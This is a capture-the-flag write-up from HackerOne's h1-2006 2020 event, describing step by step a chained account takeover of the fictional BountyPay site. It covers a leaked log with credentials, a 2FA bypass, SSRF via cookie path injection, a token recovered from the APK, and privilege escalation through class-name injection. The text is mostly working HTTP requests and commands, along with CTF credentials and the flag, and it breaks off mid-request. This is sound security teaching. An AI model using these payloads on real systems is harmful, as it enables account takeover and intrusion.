# [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties

## Report Details
- **Report ID**: 890196
- **URL**: https://hackerone.com/reports/890196
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-03T14:52:49.638Z
- **Disclosed**: 2020-06-18T15:39:12.254Z

## Reporter
- **Username**: fersingb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Summary:

1. A publicly accessible logfile discloses a user's credentials
2. Weak 2FA implementation allows user account takeover
3. Path injection in user's cookie allows SSRF, bypassing the IP restriction to list available builds on [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/)
4. API token leak in downloaded APK from [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/)
5. Leaked API token allows staff account creation using the staff ID found on Twitter [https://twitter.com/SandraA76708114/status/1258693001964068864](https://twitter.com/SandraA76708114/status/1258693001964068864)
6. Class name injection in HTML elements combined with staff Dashboard report feature leads to privilege escalation as Admin, disclosing the CEO password
7. CSS injection in 2FA app leaks the 2FA code via OOB channel
8. All hackers paid: ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

# Detailed reproduction steps:


# Logging in as regular user (brian.oliver)

Subdomain enumeration on the target [bountypay.h1ctf.com](http://bountypay.h1ctf.com) revealed multiple subdomains:

```
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
app.bountypay.h1ctf.com
api.bountypay.h1ctf.com
www.bountypay.h1ctf.com
```

During my content discovery phase on those domains, I found an interesting `.git/config` file on [app.bountypay.h1ctf.com](http://app.bountypay.h1ctf.com): 

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

The source code in the GitHub repository leaked the format, name and location of the log file. The file was unprotected on the target system and I downloaded it from this url: [https://app.bountypay.h1ctf.com/bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log)

The log file contains timestamps and information about the HTTP request that was made at that time. The request info is base64 encoded:

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

This can easily be decoded using a simple for loop in bash:

```bash
$ for line in $(cat bp_web_trace.log) ; do echo $line|cut -d: -f2|base64 -d ; echo ;done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

I then used those credentials on the login page at [https://app.bountypay.h1ctf.com/](https://app.bountypay.h1ctf.com/) and was greeted with a 2FA form:

{F853775}

I sent a random password and inspected the request in Burp Suite. I saw this:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Upgrade-Insecure-Requests: 1

username=brian.oliver&password=V7h0inzX&challenge=13d6718efc0a44576c8aad1a6f193521&challenge_answer=myAnswer
```

The request got a **401 Unauthorized** response, which was expected. Bruteforce was not an option, because of the length of the password and the charset that was used. After playing around with the values, I noticed that the `challenge` ID was actually the md5 hash of the answer. Here is a request that will bypass the 2FA, I used the Hackvector Burp extension because it's convenient, but hashing the answer using any other tool works as well. 

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Upgrade-Insecure-Requests: 1

username=brian.oliver&password=V7h0inzX&challenge=<@md5_5>a<@/md5_5>&challenge_answer=a 
```

This request got a **302 Found** response with a cookie:

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 13:30:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 01-Jul-2020 13:30:33 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

Using that cookie I was able to successfully log in as Brian Oliver and got access to the BountyPay dashboard:

{F853777}


# Bypassing the IP restriction on [https://software.bountypay.h1ctf.com/](https://software.bountypay.h1ctf.com/) using SSRF

After I got access to the dashboard I started looking at the requests that were made. There was no pending transaction for that user. I tested the parameters for SQLi without success, but the response returned by the server still looked interesting.

Request:

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:13:03 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

The `url` returned in the response's JSON was interesting. It looks like the backend is calling an API, using some kind of account ID to construct the path. I tried to call that API directly but this resulted in a **401 Unauthorized**, telling me a token was missing. We'll come back to that later, but right now my only option was to leverage the call made by the server. What if I could control that ID? The user cookie starts with `ey` which is typical of base64 encoded JSON, maybe there is something interesting there. Here is the decoded cookie:

```json
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

The `account_id` field in the decoded cookie matched the account ID used to construct the API URL, so I gave it a try an modified the `account_id` field. Here again, Hackvector is a really useful Burp extension and saves a lot of back and forth between the Repeater and the Decoder.

Request:

```
GET /statements?month=01&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 14:31:10 GMT
Content-Type: application/json
Connection: close
Content-Length: 205

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=11&year=2019","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

Bingo, I had control over the request that was made to the API server side. Again, I tested the get parameters for SQLi, hoping I could maybe bypass some special characters filtering by talking directly to the API, but still no luck. I had to find how to leverage that SSRF vulnerability.

I browsed the API home page at [https://api.bountypay.h1ctf.com/](https://api.bountypay.h1ctf.com/) and unfortunately there was no information about any documentation. However I noticed that one link on that page was using a redirect:

{F853783}

During the initial recon phase I discovered multiple subdomains. All of them were accessible, except one:  [software.bountypay.h1ctf.com](http://software.bountypay.h1ctf.com):

{F853790}

This server had an IP restriction in place, probably to restrict the access to internal traffic only, maybe I could get something from it using the SSRF I just found. Again, using Burp Repeater and Hackvector I tried to use the redirect to reach that server.

Request:

```
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 16:51:59 GMT
Content-Type: application/json
Connection: close
Content-Length: 1609

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=11&year=2019",
"data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
```

It worked! But this was not the end. The HTML that was returned by the response seems to contain a login form (POST) to access the **Software Storage** service. Since the backend server was performing GET requests, it was not possible to interact with this form. I had to find something else.

I fired up Burp Intruder and started scanning for directories. Again Hackvector made the process a breeze:

```
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/§§#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

After some time, I discovered the `uploads` folder that contained the **BountyPay.apk**:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 17:01:42 GMT
Content-Type: application/json
Connection: close
Content-Length: 493

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads#\/statements?month=11&year=2019",
"data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

It wasn't possible to download the APK using the SSRF. Fortunately, the full path to the APK, [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) was publicly accessible. I downloaded the Android app and started exploring it.


# Getting the API token from the Android app

Once I downloaded the APK I converted it to a jar file using `dex2jar`

```bash
$ d2j-dex2jar BountyPay.apk   
dex2jar BountyPay.apk -> ./BountyPay-dex2jar.jar
```

I then opened the jar file with IntelliJ and stated looking at the code:

{F853780}

The `bounty.pay` package contained some interesting classes. Those classes were also mentioned in the **AndroidManifest.xml** file, where they were configured to listen to some intents:

```xml
	<activity android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="three"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="two"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
            <intent-filter android:label="">
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:host="part" android:scheme="one"/>
            </intent-filter>
        </activity>
        <activity android:name="bounty.pay.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```

I installed the app on an Android device and started it. I was greeted with a form asking me for my username and twitter handle, once I created a username I landed on PartOneActivity:

{F853784}

There was not much to interact with, but reading the code gave me a lot of information about what to do here:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            String var2 = this.getIntent().getData().getQueryParameter("start");
            if (var2 != null && var2.equals("PartTwoActivity") && var4.contains("USERNAME")) {
                var2 = var4.getString("USERNAME", "");
                Editor var3 = var4.edit();
                String var5 = var4.getString("TWITTERHANDLE", "");
                var3.putString("PARTONE", "COMPLETE").apply();
                this.logFlagFound(var2, var5);
                this.startActivity(new Intent(this, PartTwoActivity.class));
            }
}
```

What did the code tell me? Well, there is not much to do on this activity, but if I invoke it with the right parameters, it will save my progress and start PartTwoActivity for me. Note that I tried to bypass the PartOneActivity completely by firing an intent for PartTwo, but that didn't work. I still have to log the fact we successfully went through PartOne.

Based on the AndroidManifest file, I knew the intent URL to interact with PartOneActivity is `one://part` , and the code tells me it's expecting a `start=PartTwoActivity` parameter. I managed to reach PartTwoActivity using the following adb command:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity"
```

{F853786}

When I clicked on the BountyPay logo, the app showed a message telling me some information was currently hidden. By looking at the code I figured out how to make the information visible:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            Uri var5 = this.getIntent().getData();
            String var7 = var5.getQueryParameter("two");
            String var8 = var5.getQueryParameter("switch");
            if (var7 != null && var7.equals("light") && var8 != null && var8.equals("on")) {
                var2.setVisibility(0);
                var3.setVisibility(0);
                var6.setVisibility(0);
            }
}
```

Passing the params `two=light&switch=on` should unhide the elements. That's what I did with adb:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "two://part?two=light\&switch=on"
```

This started the activity again, but this time some new elements were visible:

{F853787}

In the activity, the code that handles the submit event looks like this:

```java
public void onDataChange(DataSnapshot var1) {
                String var2x = (String)var1.getValue();
                SharedPreferences var3 = PartTwoActivity.this.getSharedPreferences("user_created", 0);
                Editor var6 = var3.edit();
                String var4 = var2;
                StringBuilder var5 = new StringBuilder();
                var5.append("X-");
                var5.append(var2x);
                if (var4.equals(var5.toString())) {
                    var2x = var3.getString("USERNAME", "");
                    String var7 = var3.getString("TWITTERHANDLE", "");
                    PartTwoActivity.this.logFlagFound(var2x, var7);
                    var6.putString("PARTTWO", "COMPLETE").apply();
                    PartTwoActivity.this.correctHeader();
                } else {
                    Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
                }

}
```

The code compares the input with a string that starts with `X-` followed by the content of `var2x.` unfortunately I couldn't find what the value of `var2x` was in this activity. Based on the content of PartThreeActivity, I guessed it was something like `X-Token: xxx`. I tried submitting the displayed hash, without success. After some time I realized I only needed the header name. I submitted `X-Token` and landed on PartThreeActivity.

{F853788}

Here again, some elements seemed to be hidden, the code that unhides the elements was similar to the one in PartTwo, but with a twist:

```java
if (this.getIntent() != null && this.getIntent().getData() != null) {
            Uri var5 = this.getIntent().getData();
            final String var10 = var5.getQueryParameter("three");
            final String var9 = var5.getQueryParameter("switch");
            final String var11 = var5.getQueryParameter("header");
            byte[] var6 = Base64.decode(var10, 0);
            byte[] var7 = Base64.decode(var9, 0);
            final String var12 = new String(var6, StandardCharsets.UTF_8);
            final String var13 = new String(var7, StandardCharsets.UTF_8);
            this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
                public void onCancelled(DatabaseError var1) {
                    Log.e("TAG", "onCancelled", var1.toException());
                }

                public void onDataChange(DataSnapshot var1) {
                    String var4 = (String)var1.getValue();
                    if (var10 != null && var12.equals("PartThreeActivity") && var9 != null && var13.equals("on")) {
                        String var2x = var11;
                        if (var2x != null) {
                            StringBuilder var3 = new StringBuilder();
                            var3.append("X-");
                            var3.append(var4);
                            if (var2x.equals(var3.toString())) {
                                var8.setVisibility(0);
                                var2.setVisibility(0);
                                PartThreeActivity.this.thread.start();
                            }
                        }
                    }

                }
            });
}
```

Some parameters must be base64 encoded and a header value must be provided. The adb command looks like this:

```bash
$ adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk%3D\&switch=b24%3D\&header=X-Token"
```

This revealed a form where I was asked to submit a leaked hash:

 

{F853789}

What leaked hash? I started looking around, double clicking on the BountyPay logo told me to check for leaks. I checked the logs using logcat and found this:

```
TOKEN IS: : 8e9998ee3137ca9ade8f372739f062c1
HEADER VALUE AND HASH : X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

I submitted the hash and voilà!

{F853791}

When I then clicked on the logo I saw a message that told me the information I got from the app might be useful, let's see.


# Creating a staff account using the leaked API token and some social network intel

Remember the **401 Unauthorized** response I got when I tried accessing the [https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/](https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/) endpoint directly? The error message mentioned a missing token. I tried again, but this time with the X-Token header:

```
GET /api/accounts/F8gHiqSdpK/ HTTP/1.1
Host: api.bountypay.h1ctf.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

And I got some data back:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:20:27 GMT
Content-Type: application/json
Connection: close
Content-Length: 81

{"account_id":"F8gHiqSdpK","owner":"Mr Brian Oliver","company":"BountyPay Demo "}
```

Knowing the token was valid for this API, I started fuzzing again, using the token in the headers. I found an interesting endpoint: 

```
# ffuf -u https://api.bountypay.h1ctf.com/api/FUZZ -w ~/lists/content_discovery_all.txt -ac -H 'X-Token: 8e9998ee3137ca9ade8f372739f062c1'                                                  
                                                                                                          
        /'___\  /'___\           /'___\                                                                   
       /\ \__/ /\ \__/  __  __  /\ \__/           
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                  
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                             
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
                                                     
       v1.1.0-git                                
________________________________________________                                                          
                                                                                                          
 :: Method           : GET                                                                                
 :: URL              : https://api.bountypay.h1ctf.com/api/FUZZ                                           
 :: Header           : X-Token: 8e9998ee3137ca9ade8f372739f062c1                                          
 :: Follow redirects : false                     
 :: Calibration      : true                                                                               
 :: Timeout          : 10                            
 :: Threads          : 40                                                                                 
 :: Matcher          : Response status: 200,204,301,302,307,401,403                                       
________________________________________________                                                                                                                                                                     
                                                                                                                                                                                                                     
staff/                  [Status: 200, Size: 104, Words: 3, Lines: 1]
staff                   [Status: 200, Size: 104, Words: 3, Lines: 1]
:: Progress: [373535/373535] :: Job [1/1] :: 2146 req/sec :: Duration: [0:02:54] :: Errors: 4 ::
```

This looked very interesting, a GET request to this endpoint gave me a list of staff members:

```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

I tried a POST request and got the following response back:

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:41:43 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

I played around a bit and after some time I found out the required parameter was `staff_id`. I tried passing an existing staff id, but it didn't work, I got an error saying the staff member already had an account. I also tried a random ID, no luck, it had to be a valid staff ID from a staff member that didn't had an account yet. That's where the social network intel was useful. Few weeks ago one of the new BountyPay employees posted a message on twitter, mentioning `@BountyPayHQ`:

{F853796}

The badge on this picture contains a staff ID. I tried creating an account using it and it worked:

```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3
```

Response:

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 20:53:53 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

Now I have a staff account, it's time to use it!


# Privilege escalation, from regular staff member to admin

The BountyPay home page has two login options: app and staff. I already covered the app part when I explained how I logged in as brian.oliver at the very beginning. After I created a staff account it was time to explore the staff portal. On the home page, I selected the login → staff option. I used sandra's username and password on the login form and I got access to the staff portal:

{F853792}

The staff portal is composed of multiple tabs:

- Home tab: Nothing there
- Support Tickets tab: allows staff members to read support tickets sent to them. This tab contains an automated message sent by Admin, but there is no way to reply to it:

{F853794}

- Profile tab: This is where the staff member can update his avatar and profile name:

{F853793}

Nothing really exciting so far, but the Javascript code was more interesting. Here is the content of the `website.js` file that is loaded by the portal:

```jsx
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

This code discloses an interesting endpoint, `/admin/upgrade`, which can be used to promote a staff member to the Admin role by passing its username as GET parameter. I tried to make the admin call that URL using the `report` function, but it didn't work since admin pages are ignored, as explained in the modal dialog:

{F853785}

How to send a report about a non admin page, but still trigger that call to upgrade? That's very tricky, but still possible using Javascript. On this portal, the JS code declares handlers for the `click` event on multiple classes:

- The handler on the `tab` class, to switch between tabs
- The handler on the `upgradeToAdmin` class, which might correspond to a button on the admin interface. When clicked it triggers the call to `/admin/upgrade`
- The handler on the `sendReport` class, that is triggered when the Report Now button is clicked

On top of that, the JS code also looks at the `location.hash` variable, and automatically fires a click event on the tab that is passed as a hash value in the URL. For example, the URL [https://staff.bountypay.h1ctf.com/?template=home#tab2](https://staff.bountypay.h1ctf.com/?template=home#tab2) would load the portal and the JS code would then trigger a `click` event on the `tab2`, which will then fire the tab switching function. What if I could do the same but with `upgradeToAdmin` instead?

Unfortunately I couldn't just pass `#upgradeToAdmin` to the URL, this wouldn't trigger anything since there is no JS code checking for that. The solution here is to find, or create an element that has both classes: `tabX` and `upgradeToAdmin`. 

This can be done using the avatar selection feature from the profile tab. The avatar image is actually set using a class name, by intercepting the avatar change request and changing its value to `tab1%20upgradeToAdmin` I managed to create an element that has both classes:

```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://staff.bountypay.h1ctf.com
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

profile_name=sandra&profile_avatar=tab1%20upgradeToAdmin
```

{F853776}

After doing this, saw the call to the upgrade endpoint being fired when I opened this URL: [https://staff.bountypay.h1ctf.com/?template=home#tab1](https://staff.bountypay.h1ctf.com/?template=home#tab1)

{F853778}

The username was still undefined, but I'll cover this part later. First I'd like to explain how this worked. By creating an element that has both classes, `tab1` and `upgradeToAdmin`, I created an element that was a valid target for the `$('.tab1')` selector which is used to trigger a `click` event when the `#tab1` hash is present, and since this `click` event was triggered on an element that also had the `upgradeToAdmin` class, it fired the handler for this class and called the `upgrade` endpoint.

At that point I managed to get a call to the upgrade endpoint, but the username was still undefined. The username value is extracted using the `$('input[name="username"]')` selector. This element exists in the login template and it's possible to pre-fill the value using the `username` query parameter. Doing so I was able to bring the `username` input field in scope, but I lost the `website.js` file my element with my "avatar" class. I had to find a way to load both templates at the same time. After playing around with the `template` parameter, I managed to load both `home` and `login` templates using the PHP multi-values syntax: [https://staff.bountypay.h1ctf.com//?template[]=login&template[]=home&template[]=ticket&ticket_id=3582&username=sandra.allison#tab1](https://staff.bountypay.h1ctf.com//?template%5B%5D=login&template%5B%5D=home&template%5B%5D=ticket&ticket_id=3582&username=sandra.allison#tab1)

Note that I had to also load the ticket template and load the ticket the Admin sent to sandra. This was necessary to bring sandra's "avatar" in scope and make the click event work:

{F853779}

The final step was then to encode that URL in base64 and report it to the admin:

```
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109aG9tZSZ0ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ1c2VybmFtZT1zYW5kcmEuYWxsaXNvbiN0YWIx HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
